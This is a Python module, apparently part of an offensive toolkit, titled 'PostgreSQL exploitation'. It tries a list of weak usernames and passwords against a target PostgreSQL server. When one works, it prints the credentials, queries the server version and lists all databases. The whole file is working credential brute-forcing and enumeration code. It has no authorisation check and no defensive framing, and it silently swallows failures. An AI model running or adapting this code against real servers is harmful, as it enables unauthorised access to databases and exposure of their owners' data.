"""PostgreSQL exploitation"""

from ..config import POSTGRESQL_CREDENTIALS, DEFAULT_TIMEOUT

def exploit_postgresql_weak_creds(target, port=5432):
    """
    Test PostgreSQL with weak credentials
    Returns: Result dict or None
    """
    print(f"\n[*] Testing PostgreSQL on {target}:{port}")
    
    try:
        import psycopg2
    except ImportError:
        print("    [!] psycopg2 not installed")
        print("    [!] Install: pip3 install psycopg2-binary")
        return None
    
    credentials = POSTGRESQL_CREDENTIALS
    
    for username, password in credentials:
        try:
            conn = psycopg2.connect(
                host=target,
                port=port,
                user=username,
                password=password,
                database='postgres',
                connect_timeout=DEFAULT_TIMEOUT
            )
            
            print(f"    [+] SUCCESS! {username}:{password}")
            
            # Get version
            cursor = conn.cursor()
            cursor.execute("SELECT version()")
            version = cursor.fetchone()[0]
            
            print(f"    [+] PostgreSQL Version: {version}")
            
            # List databases
            cursor.execute("SELECT datname FROM pg_database")
            databases = [db[0] for db in cursor.fetchall()]
            
            print(f"    [+] Databases: {', '.join(databases)}")
            
            conn.close()
            
            return {
                'service': 'PostgreSQL',
                'port': port,
                'username': username,
                'password': password,
                'version': version,
                'databases': databases,
                'status': 'success'
            }
            
        except psycopg2.OperationalError:
            pass
        except Exception as e:
            pass
    
    print("    [-] No valid credentials found")
    return None